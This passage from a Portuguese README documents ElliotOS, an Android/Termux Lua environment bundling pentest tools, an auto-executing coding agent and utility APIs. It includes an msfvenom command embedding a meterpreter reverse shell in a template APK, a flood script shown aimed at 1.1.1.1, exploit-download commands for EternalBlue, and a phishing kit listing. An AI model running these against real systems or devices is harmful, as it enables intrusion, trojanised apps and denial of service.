ell.encode_str(code, 'lua')         -- codifica string em memória → string .ell
ell.decode_str(data)                -- decodifica string .ell → código original
ell.help()                          -- ajuda do módulo
```

---

### `agent.*` — Agente autônomo

Agente que usa a CYN para escrever código, executar, ver o erro, corrigir e iterar automaticamente.

```lua
agent.run('tarefa' [, opts])   -- executa tarefa em loop (opts: {auto=true, lang='lua'|'c'|'bash', max=N})
agent.chat('msg')              -- conversa livre sem execução de código
agent.reset()                  -- limpa o contexto/histórico do agente
agent.help()                   -- ajuda do módulo
```

```lua
-- Exemplos:
agent.run('faça um servidor HTTP em Lua', {auto=true})
agent.run('crie um port scanner em bash')
agent.chat('como funciona heap spray?')
```

---

### `ivar.*` — Variáveis indexadas (v2.0)

Toda variável declarada recebe automaticamente um índice `!N`, permitindo referenciá-la pelo número em vez do nome completo. Ideal para nomes longos em projetos sérios, UIs e jogos. **Ativado por padrão desde a instalação.**

```lua
ivar.enable()          -- ativa (padrão)
ivar.disable()         -- desativa
ivar.status()          -- status + vars, escopos e aliases
ivar.list()            -- mapa !N → nome = valor_atual
ivar.alias("hp", "player_health_percentage")  -- registra !hp → variável
ivar.alias()           -- lista todos os aliases
ivar.debug(true)       -- avisa em stderr ao registrar cada variável
ivar.reset()           -- limpa índices, aliases e pilha de escopos
ivar.preprocess(code)  -- pré-processa string substituindo !N e !alias
ivar.help()            -- ajuda rápida
```

**Índices numéricos:**
```lua
nome_longo_aqui = "Mike"   -- !1 → nome_longo_aqui
player_score    = 9800     -- !2 → player_score
print(!1, !2)              -- print(nome_longo_aqui, player_score)
ivar.list()                -- !1 → nome_longo_aqui = "Mike" | !2 → player_score = 9800
```

**Aliases nomeados** — a linha `!alias = varname` é interceptada pelo pré-processador e não chega ao Lua:
```lua
player_health_percentage = 100
!hp = player_health_percentage   -- registra alias (linha some do código)
print(!hp)                        -- expande para player_health_percentage
```

**Escopo por função** — dentro de cada `function`, `!1` reinicia do zero:
```lua
function ataque()
    dano_base    = 10   -- !1 neste escopo
    multiplicador = 2   -- !2 neste escopo
    return !1 * !2      -- return dano_base * multiplicador
end
```

**Modo debug:**
```lua
ivar.debug(true)   -- ativa
x = 10             -- stderr: [ivar:debug] !1 → x
ivar.debug(false)  -- desativa
```

Persistência: estado salvo em `~/.elliot_ivar.cfg`. Resetado automaticamente a cada reinstalação para garantir que o ivar inicie ativo.

---

### `ms.*` — Utilitários do sistema

```lua
ms.b64.enc(str [,url_safe])  -- Base64 encode (url_safe=true para URL-safe)
ms.b64.dec(str)              -- Base64 decode → bytes raw
ms.b64.auto(str)             -- auto-detect e decode com análise
ms.b64.help()                -- ajuda do submódulo b64
ms.check()                   -- self-test: verifica todos os módulos
ms.check('v')                -- self-test verbose
ms.force()                   -- stress test real de todos os módulos
ms.alias(nome, fn)           -- cria alias global no REPL
ms.help()                    -- ajuda do módulo ms
```

---

### `string.*` — Extensões de string

Todas as funções abaixo são adicionadas à biblioteca `string` padrão do Lua:

```lua
-- Busca / verificação
string.startswith(s, prefix)    string.endswith(s, suffix)
string.contains(s, sub)         string.count_occ(s, sub)
string.isalpha(s)               string.isalnum(s)
string.isnumeric(s)             string.isinteger(s)
string.islower(s)               string.isupper(s)
string.isspace(s)

-- Transformação
string.trim(s)                  string.ltrim(s)        string.rtrim(s)
string.lower(s)                 string.upper(s)
string.capitalize(s)            string.title(s)        string.swapcase(s)
string.slugify(s)               string.truncate(s, n [,suf])
string.repeat_str(s, n)         string.removeprefix(s, pre)
string.removesuffix(s, suf)

-- Divisão / junção
string.split(s [,sep])          string.lines(s)        string.words(s)
string.partition(s, sep)        string.rpartition(s, sep)

-- Alinhamento / padding
string.ljust(s, n [,fill])      string.rjust(s, n [,fill])
string.center(s, n [,fill])     string.lpad(s, n [,fill])
string.rpad(s, n [,fill])       string.zfill(s, n)
string.expandtabs(s [,ts])

-- Encoding / escaping
string.encode_url(s)            string.decode_url(s)
string.escape_html(s)           string.unescape_html(s)
string.interpolate(s, t)        -- ex: string.interpolate("Ola {nome}", {nome="Mike"})

string.help()                   -- ajuda do módulo
```

---

### `util.*` — Stdlib funcional

```lua
-- Coleções
util.map(t, fn)               util.filter(t, fn)        util.reduce(t, fn [,acc])
util.any(t, fn)               util.all(t, fn)            util.count(t [,fn_or_val])
util.sum(t [,fn])             util.min(t [,fn])          util.max(t [,fn])
util.sorted(t [,fn])          util.unique(t)             util.flatten(t [,depth])
util.chunk(t, n)              util.groupby(t, fn)        util.zip(...)
util.enumerate(t [,start])    util.keys(t)               util.values(t)
util.range(a [,b [,step]])    util.first(t [,n])         util.last(t [,n])
util.index_of(t, val)         util.without(t, val)       util.union(...)
util.intersection(...)        util.difference(a, b)      util.flat_map(t, fn)
util.rotate(t, n)             util.interleave(...)       util.tally(t)
util.transpose(t)             util.combinations(t, n)    util.permutations(t [,n])

-- Transformação de tabelas
util.pick(t, keys)            util.omit(t, keys)         util.merge(...)
util.deepcopy(t)              util.default(t, def)

-- Funções de ordem superior
util.partial(fn, ...)         util.compose(...)          util.pipe(...)
util.memoize(fn)              util.once(fn)              util.retry(fn, n [,delay_ms])
util.flip(fn)                 util.identity(x)           util.noop()
util.always(x)                util.tap(x, fn)

-- Predicados
util.truthy(x)                util.falsy(x)

-- Utilitários
util.with_file(path, mode, fn)   -- abre arquivo, passa para fn, fecha automaticamente
util.printf(fmt, ...)            -- printf formatado
util.pp(v)                       -- pretty-print de qualquer valor
util.func(mod)                   -- lista funções de qualquer módulo ou tabela

util.help()                      -- ajuda do módulo
```

**`util.func` — inspetor de módulos:**
```lua
util.func(math)        -- lista todas as funções do math.*
util.func('socket')    -- carrega e inspeciona módulo luarocks
util.func(net)         -- inspeciona módulos do ElliotOS
util.func(mind)        -- qualquer tabela/módulo desconhecido
```

Detecta nomes dos parâmetros via `debug.getinfo` para funções Lua puras. Funções C são marcadas com `[C]`.

---

### `json.*` — JSON nativo

```lua
json.encode(v)   -- Lua → JSON string (nil→"null", bool, number, string, table)
json.decode(s)   -- JSON string → Lua value
```

---

### `back()` — Saída temporária para bash

```lua
back()   -- cai no bash interativo; ao digitar 'exit', volta ao REPL ms
```

---

### `lg()` e `ic()` — Logo

```lua
lg()   -- exibe logo ASCII do ElliotOS no terminal
ic()   -- exibe logo PNG via timg (requer timg instalado)
```

---

## xtun — Tunnel Toolkit

Ferramenta standalone compilada em C para criação de túneis TCP e UDP, sem root, sem dependências externas.

```bash
# Local forward (como ssh -L)
xtun -L [bind:]lport:rhost:rport

# Reverse forward (como ssh -R)
xtun -R [bind:]lport:rhost:rport

# Forward UDP (datagrama, sem conexão)
xtun -U [bind:]lport:rhost:rport

# Modo listener cru (proxy TCP simples)
xtun -l porta
```

Útil para expor portas locais (servidores Love2D/LAN, painéis web) para fora do device sem root.

---

## appforge — HTML/CSS/JS para APK

O `appforge` converte qualquer projeto web local em um APK Android funcional, **sem root, sem Android Studio, sem PC**. Não vem instalado por padrão — é uma ferramenta do XPM:

```bash
xpm install appforge
```

```bash
# Estrutura mínima do projeto
./meuapp/
├── index.html   ← ponto de entrada obrigatório
├── style.css
└── script.js

# Analisar o projeto antes de compilar
appforge check ./meuapp/

# Gerar APK básico
appforge build ./meuapp/

# Com nome, ícone e permissões
appforge build ./meuapp/ --name "Meu App" --pkgname com.meuapp --perm camera,mic --fullscreen

# Converter um site remoto em APK
appforge build --url https://exemplo.com --name "Meu Site"

# Gerar template de projeto
appforge template basic    # HTML + CSS + JS básico
appforge template game     # Jogo Snake funcional
appforge template pwa      # PWA com suporte offline

# Manual
appforge --man
```

### Opções principais do `appforge build`

| Opção | Descrição |
|-------|-----------|
| `--name "Nome"` | Nome exibido no launcher |
| `--pkgname com.pkg.id` | Package ID único |
| `--icon /path/icon.png` | Ícone PNG do app |
| `--perm cam,mic,...` | Permissões Android |
| `--orientation portrait\|landscape\|auto` | Orientação da tela |
| `--fullscreen` | Esconde a status bar |
| `--theme dark\|light\|transparent` | Tema da WebView |
| `--url https://...` | Carrega URL remota |

---

## ms -ba — Arch Linux ARM + BlackArch

O `ms -ba` instala o **Arch Linux ARM** dentro do Termux via proot e configura o repositório **BlackArch** — dando acesso a mais de 2.800 ferramentas de segurança, sem root.

```bash
ms -ba
```

### Suporte

| Modo | NetHunter | BlackArch |
|------|-----------|-----------|
| CLI  | ✓         | ✓         |
| GUI (XFCE4/VNC) | ✓ | ✗ (não suportado em proot) |

### Acessar o container

```bash
archlinux          # entra no Arch Linux ARM como root
```

### Instalar ferramentas BlackArch

```bash
# Dentro do container (archlinux):
pacman -S nmap sqlmap burpsuite
pacman -Sg blackarch            # lista todos os grupos
pacman -Sg blackarch-scanner
pacman -Sg blackarch-exploitation
```

---

## XPM — Gerenciador de Pentest

O `xpm` instala ferramentas de segurança **sem usar o repositório do Termux**. Tudo é compilado do código-fonte ou instalado via pip/go/cargo diretamente.

```bash
xpm search list            # ver todas as ferramentas disponíveis
xpm search nmap            # buscar ferramenta específica
xpm install sqlmap         # instalar
xpm install sqlmap nikto dirsearch nmap  # instalar várias
xpm list                   # ver o que está instalado
xpm update sqlmap          # atualizar ferramenta específica
xpm upgrade                # atualizar tudo (respeita pins)
xpm remove sqlmap          # remover
xpm info <ferramenta>      # detalhes + versão instalada
xpm categories             # categorias disponíveis
xpm stats                  # estatísticas completas com versões
xpm cache                  # conteúdo e tamanho do cache
xpm clean                  # limpar cache
xpm doctor                 # diagnóstico e correções do ambiente
```

### Pins — travar versão de uma ferramenta

```bash
xpm pin sqlmap             # trava sqlmap na versão atual
xpm pin sqlmap nikto       # trava várias de uma vez
xpm unpin sqlmap           # libera para atualização
xpm upgrade                # ferramentas pinadas são ignoradas com aviso
```

Útil quando uma atualização quebra compatibilidade com um script ou exploit em uso. O `xpm stats` e `xpm info` mostram quais ferramentas estão pinadas e em qual versão.

### Rastreamento de versão

A partir da v1.5.0, o `xpm` rastreia automaticamente a versão de cada ferramenta instalada. O `xpm info` mostra a versão detectada na instalação e `xpm stats` lista todas as ferramentas com suas versões e datas. Ferramentas com versão detectável exibem o diff antes/depois no `xpm update` (`1.2.3 → 1.3.0`).

### Pré-requisitos de sistema automáticos

Ferramentas como `impacket`, `pwntools`, `ropper`, `binwalk`, `wfuzz` e `dnsrecon` instalam automaticamente as dependências de sistema necessárias antes de rodar o pip, sem intervenção manual.

### Ferramentas disponíveis no XPM

| Categoria | Ferramentas |
|-----------|-------------|
| Scanner | nmap, rustscan, naabu |
| Web | sqlmap, nikto, commix, whatweb, xsstrike |
| Fuzzing | ffuf, gobuster, dirsearch, wfuzz |
| Reconhecimento | amass, subfinder, assetfinder, dnsrecon |
| OSINT | sherlock, maigret, holehe, sublist3r, theharvester |
| Password | hydra, john |
| Exploração | metasploit, sqlmap, searchsploit, slowloris |
| Engenharia Reversa | radare2, binwalk, ropper, androguard |
| MITM | mitmproxy |
| Malware | yara |
| Eng. Social | zphisher |
| CTF / Binários | pwntools |
| Wordlists | seclists |
| AD / Rede | impacket, nuclei |
| Criação de APK | appforge |

> **Nenhuma ferramenta exige root para ser instalada ou usada no Termux.**

---

## msfvenom — Payload em APK com template

```bash
# Passo 1 — instalar as ferramentas
xpm install apkfull apkeditor metasploit

# Passo 2 — configurar o ambiente
xpm doctor
```

```bash
# Gerar payload e injetar em APK template
msfvenom -p android/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 \
  -x /caminho/template.apk \
  -o payload.apk
```

---

## LPM — Gerenciador de Pacotes Lua

```bash
# Instalar módulo do LuaRocks (fallback automático: lux/GitHub)
lpm install luasocket

# Forçar por fonte específica
lpm install --from lux luasocket
lpm install --from luarocks luasocket

# Remover / listar
lpm remove luasocket
lpm list

# Buscar exploits
lpm --script -s eternalblue
lpm --script -s eternalblue --source packetstorm
lpm --script -l                        # fontes disponíveis
lpm --script -i 3                      # baixa item 3 do último resultado
lpm install --from exploit eternalblue
```

**Fontes:** `exploit-db` (padrão), `packetstorm`, `github`  
**Scripts baixados em:** `~/.elliot/scripts/`

---

## Scripts de exemplo

O ElliotOS instala scripts prontos em `$PREFIX/share/lua-scripts/`. Liste com `ms --examples`.

| Script | Descrição |
|--------|-----------|
| `learn.lua` | Tutorial interativo — 35 lições em 5 trilhas (do Termux ao pentest real) |
| `recon.lua` | Recon completo: ping, DNS, port scan com threads, banner grab, headers, OS fingerprint |
| `portscan.lua` | Port scanner rápido com threads e banner grab |
| `webcheck.lua` | Auditoria de headers HTTP — gera score de segurança em % |
| `hashcrack.lua` | Cracker MD5/SHA256 via wordlist |
| `nexus.lua` | Framework de rede: flood (UDP/TCP/HTTP/ICMP/PSYN), slowloris, recon, DNS |

```bash
ms --script recon -- alvo.com
ms --script portscan -- 192.168.1.1 1 9999 32
ms --script webcheck -- https://alvo.com
ms --script hashcrack -- d8578edf8458ce06fbc5bb76a58c5ca4 wordlist.txt
ms --script nexus -- --recon 192.168.1.1 -p 22,80,443
ms --script nexus -- --udp 1.1.1.1 -p 53 -s 500 -t 16 -x 512
```

---

## Documentação e aprendizado

### `ms --learn` — Tutorial completo (35 lições)

| Trilha | Conteúdo | Lições |
|--------|----------|--------|
| **0 — Do zero** | O que é Termux, comandos básicos, instalar ElliotOS, lógica de programação, primeiro programa | 1–5 |
| **1 — Lua** | Variáveis, tipos, operadores, if/else, loops, funções, tables, strings, módulos, OOP, pcall, corrotinas | 6–17 |
| **2 — ElliotOS API** | net.*, mod.*, crypto.*, sys.*, fs.*, ai.*, db.*, scripts profissionais, lpm/xpm | 18–26 |
| **3 — C no ElliotOS** | Base de C, tipos, ponteiros, memória, sockets raw, criar módulo `.so` | 27–32 |
| **4 — Projetos reais** | Scanner completo, port scanner multi-thread, próximos passos | 33–35 |

### `ms --doc` — Referência da API

```bash
ms --doc               # visão geral + comandos especiais do REPL
ms --doc modulos       # todos os módulos
ms --doc net           # net.*
ms --doc mod           # mod.*
ms --doc crypto        # crypto.*
ms --doc sys           # sys.*
ms --doc fs            # fs.*
ms --doc ai            # ai.*
ms --doc db            # db.*
ms --doc web           # web.*
ms --doc dow           # dow.*
ms --doc lmod          # lmod.*
ms --doc adb           # adb.*
ms --doc pent          # pent.*
ms --doc sh            # sh.*
ms --doc cc            # cc.*
ms --doc ui            # ui.*
ms --doc tui           # tui.*
ms --doc exploit       # exploit.* (REPLs de pós-exploração)
ms --doc ell           # ell.* (encoder/decoder de scripts)
ms --doc agent         # agent.* (agente autônomo)
ms --doc ivar          # ivar.* (variáveis indexadas)
ms --doc string        # string.*
ms --doc util          # util.*
ms --doc json          # json.*
```

---

## Interface Gráfica (opcional)

```bash
elliot-gui               # inicia servidor X11 + XFCE4
elliot-gui -b            # inicia em background
elliot-gui -m            # modo mobile (ícones grandes)
elliot-gui --kill        # encerra sessão gráfica
```

### rungui — executa qualquer script com X11 automático

```bash
rungui -l <lang> [-t <lib>] <arquivo>
```

| Linguagem | Bibliotecas disponíveis |
|-----------|-------------------------|
| `python` | tkinter, pygame, wx, PyQt5, PyQt6, kivy, arcade, pyglet, turtle, glfw |
| `c` / `c++` | gtk, gtk3, gtk4, sdl2, sfml, opengl, fltk, wx |
| `java` | swing, javafx, awt |
| `love` | Love2D (diretório do projeto) |
| `lua` | — |

```bash
rungui -l python -t tkinter app.py
rungui -l c -t gtk janela.c
rungui -l love jogo/
```

---

## Estrutura do projeto

```
ElliotOS/
├── luascript.sh              # Script único de instalação (v17.0) — xpm v1.5.0
│   ├── libnet.c              # Biblioteca C com todos os módulos
│   ├── Lua 5.4.8 source      # Interpretador customizado (baixado de lua.org)
│   ├── xpm                   # Gerenciador de pentest (Bash)
│   │   └── appforge          # Conversor HTML/CSS/JS → APK
│   ├── lpm                   # Gerenciador de pacotes Lua (Bash)
│   ├── cxx                   # Compilador wrapper (Bash)
│   ├── ee                    # Editor nativo (C, embutido)
│   ├── xtun                  # Tunnel Toolkit (C, embutido)
│   └── scripts/              # learn.lua, recon.lua, portscan.lua,
│                             # webcheck.lua, hashcrack.lua, nexus.lua...
└── README.md
```

### Diretórios criados na instalação

| Caminho | Conteúdo |
|---------|----------|
| `$HOME/.lua-net-build` | Diretório de compilação |
| `$HOME/.lua-cache` | Cache de downloads (fontes do Lua) |
| `$HOME/.lua-modules` | Módulos do usuário (lmod) |
| `$HOME/.elliotai` | Configuração e cache da CYN |
| `$HOME/.elliot` | Dados do usuário, scripts baixados via lpm |
| `$HOME/.xpm/pins` | Versões pinadas pelo `xpm pin` |
| `$HOME/.xpm/installed` | Metadados das ferramentas instaladas (versão, data, origin) |
| `$HOME/.elliot_logs` | Log de vulnerabilidades encontradas |
| `$HOME/.elliot_ivar.cfg` | Estado persistente do ivar (ativado/desativado) |
| `$PREFIX/share/lua-scripts` | Scripts de exemplo do ElliotOS |
| `$PREFIX/share/c-scripts` | Scripts C prontos |
| `$PREFIX/share/lua-modules` | Módulos Lua do sistema |

---

## Requisitos de hardware

| Item | Mínimo |
|------|--------|
| Android | 7.0+ (SDK 21) |
| Android recomendado | 9.0+ (SDK 28) |
| Termux | 0.118+ (F-Droid) |
| RAM | 2 GB |
| Armazenamento livre | 2 GB (com ferramentas XPM, mais) |
| Root | **Não necessário** |
| Conexão | Necessária apenas na instalação |

---

## Autor

**Mike Elliot** — desenvolvedor independente, criador do ElliotOS.

- YouTube: [@Mikeelliotmkll12](https://youtube.com/@Mikeelliotmkll12)
- GitHub: [github.com/mikeelliot218](https://github.com/mikeelliot218)

---

## Licença

MIT — livre para usar, estudar, modificar e distribuir. Gratuito para sempre.

---

<div align="center">

*"Black Arch, Kali, Parrot — todos no PC. O ElliotOS fica no bolso."*

**⭐ Se o projeto te ajudou, deixa uma estrela no repositório.**

</div>
